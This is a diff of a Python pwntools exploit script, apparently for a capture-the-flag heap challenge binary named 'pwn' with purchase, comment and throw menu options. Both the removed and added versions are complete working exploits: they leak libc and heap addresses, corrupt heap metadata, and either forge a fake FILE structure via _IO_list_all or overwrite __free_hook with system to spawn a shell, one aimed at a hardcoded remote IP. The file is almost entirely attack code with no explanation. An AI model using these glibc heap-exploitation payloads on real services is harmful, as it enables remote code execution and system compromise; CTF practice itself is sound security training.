@@ -1,125 +1,146 @@
+#!/usr/bin/python2
+# -*- coding:utf-8 -*-
+
 from pwn import *
-context(
-    log_level='debug',
-    os='linux',
-    arch='amd64',
-    binary='./pwn'
-)
-e = context.binary
-libc = e.libc
-ip = '47.111.59.243' 
-port = 10001
-io = process()
-#io = remote(ip, port)
-#====================================================================
-def sh():
-    io.interactive()
-def menu(cmd):
-    io.sendlineafter('>>> ', str(cmd))
-def purchase(length, name, price=0):
-    menu(1)
-    io.sendlineafter('length: ', str(length))
-    io.sendlineafter('Name: ', name)
-    io.sendlineafter('ce: ', str(price))
-def comment(idx, content, score):
-    menu(2)
-    io.sendlineafter('dex: ', str(idx))
-    io.sendafter(' : ', content)
-    io.sendlineafter(': ', str(score))
-def throwit(idx):
-    menu(3)
-    io.sendlineafter(': ', str(idx))
-#====================================================================
-libc_leak_off = 0x1b2761
-heap_leak_off = 0x120
-free_hook_off = libc.symbols['__free_hook']
-malloc_hook_off = libc.symbols['__malloc_hook']
-system_off = libc.symbols['system']
-stdin_io_off = libc.symbols['_IO_2_1_stdin_']
-io_list_all_off = libc.symbols['_IO_list_all']
-one_shoot_off = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]
-#====================================================================
-purchase(0x14, '0'*0x10) #0
-comment(0, 'a'*0x8c, 0)
-purchase(0x14, '1'*0x10) #1
-comment(1, 'b'*0x8c, 0)
-purchase(0x14, '2'*0x10) #2
-throwit(0)
-throwit(1)
-purchase(0x14, '0'*0x10) #0
-comment(0, 'a', 0)
-throwit(0)
-io.recvuntil('Comment ')
-libc_base = u32(io.recv(4)) - libc_leak_off
-system = libc_base + system_off
-free_hook = libc_base + free_hook_off
-malloc_hook = libc_base + malloc_hook_off
-stdin_io = libc_base + stdin_io_off
-heap_base = u32(io.recv(4)) - heap_leak_off
-io_list_all = libc_base + io_list_all_off
-one_shoot = libc_base + one_shoot_off[5]
-purchase(0x14, '0'*0x10) #0
-comment(0, 'a'*0x8c, 0)
-purchase(0x14, '1'*0x10) #1
-comment(1, 'b'*0x8c, 0)
-purchase(0x14, '3'*0x10) #3
-purchase(0x14, '4'*0x10) #4
-throwit(2)
-throwit(3)
-purchase(0x34, 'aaaa') #2
-payload = 'b'*0xf8
-payload += p32(0x100)
-purchase(0x104, payload) #3
-purchase(0xf4, 'cccc') #5
-payload = '!'*0x28
-payload += p32(0) + p32(0x41)
-purchase(0x34, payload) #6
-throwit(2)
-throwit(3) 
-payload = 'a'*0x34
-purchase(0x34, payload) #2
-purchase(0x60, 'bbbb') #3
-payload = 'd'*8
-payload += p32(0) + p32(0x39)
-purchase(0x34, payload) #7
-purchase(0x3c, '.'*0x30) #8
-throwit(7) #get victim 
-throwit(3)
-throwit(5) #merge
-payload = 'a'*0x60
-payload += p32(0) + p32(0x19)
-payload += p32(0)*4
-payload += p32(0) + p32(0x39)
-payload += p32(heap_base + 0x308)
-purchase(0x90, payload) #3
-throwit(4)
-fake_jump = heap_base + 0x318
-fake_stdout = 'sh\x00\x00' + p32(0x31) + p32(0xdeadbeef)*2
-fake_stdout += p32(0) + p32(1) + p32(0xc0)*2
-fake_stdout += p32(0) + p32(0)*3
-fake_stdout += p32(0) + p32(0) + p32(1) + p32(0)
-fake_stdout += p32(0xffffffff) + p32(0) + p32(libc_base+0x1b3870) + p32(0xffffffff)
-fake_stdout += p32(0xffffffff) + p32(0) + p32(libc_base + 0x1b24e0) + p32(0)
-fake_stdout += p32(0)*2 + p32(0) + p32(0)
-fake_stdout += p32(0)*4
-fake_stdout += p32(0)*4
-fake_stdout += p32(0) + p32(fake_jump)
-payload = p32(0)*2
-payload += p32(0) + p32(0x39)
-payload += '\x00\x00\x00'
-purchase(0x34, payload) #5
-payload = p32(0) + p32(0x169)
-payload += p32(libc_base + 0x1b27b0) + p32(io_list_all - 0x8)
-purchase(0x34, payload) #7
-payload = p32(0)*2 + p32(system)*4*2 + p32(system)*2
-payload += fake_stdout
-#dbg()
-menu(1)
-io.sendlineafter('length: ', str(352))
-io.sendlineafter('Name: ', payload)
-io.sendlineafter('Price: ', str(1))
-menu(2)
-io.sendline('5')
-success('libc base: '+hex(libc_base))
-success('heap base: '+hex(heap_base))
-sh()
+import os
+import struct
+import random
+import time
+import sys
+import signal
+
+salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+
+def clear(signum=None, stack=None):
+    print('Strip  all debugging information')
+    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+    exit(0)
+
+for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+    signal.signal(sig, clear)
+
+# # Create a symbol file for GDB debugging
+# try:
+#     gdb_symbols = '''
+
+#     '''
+
+#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+#     f.write(gdb_symbols)
+#     f.close()
+#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+# except Exception as e:
+#     print(e)
+
+context.arch = 'amd64'
+# context.arch = 'i386'
+# context.log_level = 'debug'
+execve_file = './pwn'
+# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+# sh = process(execve_file)
+sh = remote('xxxxx', 10001)
+elf = ELF(execve_file)
+libc = ELF('./libc-2.23.so')
+# libc = ELF('/glibc/glibc-2.23/debug_x86/lib/libc.so.6')
+
+# Create temporary files for GDB debugging
+try:
+    gdbscript = '''
+    b *$rebase(0x12BA)
+    '''
+
+    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+    f.write(str(proc.pidof(sh)[0]))
+    f.close()
+
+    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+    f.write(gdbscript)
+    f.close()
+except Exception as e:
+    print(e)
+
+def Purchase(length, name):
+    sh.sendlineafter('>>> ', '1')
+    sh.sendlineafter('Name length: ', str(length))
+    sh.sendafter('Name: ', name)
+    sh.sendlineafter('Price: ', str(1))
+
+def Comment(index, comment):
+    sh.sendlineafter('>>> ', '2')
+    sh.sendlineafter('Index: ', str(index))
+    sh.sendafter(' : ', comment)
+    sh.sendlineafter('And its score: ', str(1))
+
+def Throw(index):
+    sh.sendlineafter('>>> ', '3')
+    sh.sendlineafter('WHICH IS THE RUBBISH PC? Give me your index: ', str(index))
+
+Purchase(0x8c, 'a\n')
+Purchase(0x8c, 'b\n')
+Comment(0, 'a')
+Comment(1, 'b')
+
+Throw(0)
+Throw(1)
+Purchase(1, 'a')
+Comment(0, '\x40')
+Throw(0)
+sh.recvuntil('Comment ')
+sh.recvn(8)
+result = sh.recvn(4)
+main_arena_addr = u32(result) - 48
+log.success('main_arena_addr: ' + hex(main_arena_addr))
+
+libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x18)
+log.success('libc_addr: ' + hex(libc_addr))
+
+Purchase(0xf4, 'c\n')
+Purchase(0x74, 'd\n')
+# 0x2d
+Purchase(0xfc, 'e\n')
+Throw(0)
+Purchase(0xfc, 'f\n')
+Throw(2)
+Purchase(0xfc, '\0' * 0xf8 + p32(0x1c8))
+Purchase(0x104, '/bin/sh\0\n')
+Purchase(0x104, '/bin/sh\0\n')
+Purchase(0x104, '/bin/sh\0\n')
+# pause()
+Throw(4)
+Throw(0)
+
+Purchase(0x9c, 'g\n')
+Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(main_arena_addr + 8) + '\n') # 
+# Comment(2, 'b')
+sh.sendlineafter('>>> ', '2')
+sh.sendlineafter('Index: ', str(2))
+sh.recvuntil('Comment on ')
+result = sh.recvn(4)
+heap_addr = u32(result) - 0x30
+log.success('heap_addr: ' + hex(heap_addr))
+sh.sendafter(' : ', 'b')
+sh.sendlineafter('And its score: ', str(1))
+
+Throw(4)
+Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(heap_addr + 8) + '\n') # 
+# pause()
+Throw(2)
+
+sh.sendlineafter('>>> ', '1')
+sh.sendlineafter('Name length: ', str(0x2c))
+sh.sendafter('Name: ', p32(libc_addr + libc.symbols['__free_hook'] - 12) + p32(libc_addr + libc.symbols['__free_hook'] + 0x10) + p32(libc_addr + libc.symbols['__free_hook']) + '\n')
+sh.sendlineafter('Price: ', str(0x21))
+
+sh.sendlineafter('>>> ', '2')
+sh.sendlineafter('Index: ', str(1))
+sh.sendafter(' : ', '\n')
+sh.sendlineafter('And its score: ', str(0x21))
+
+Throw(2)
+Purchase(0x1c, p32(libc_addr + libc.symbols['system']) + '\n')
+
+Throw(5)
+
+sh.interactive()
+clear()
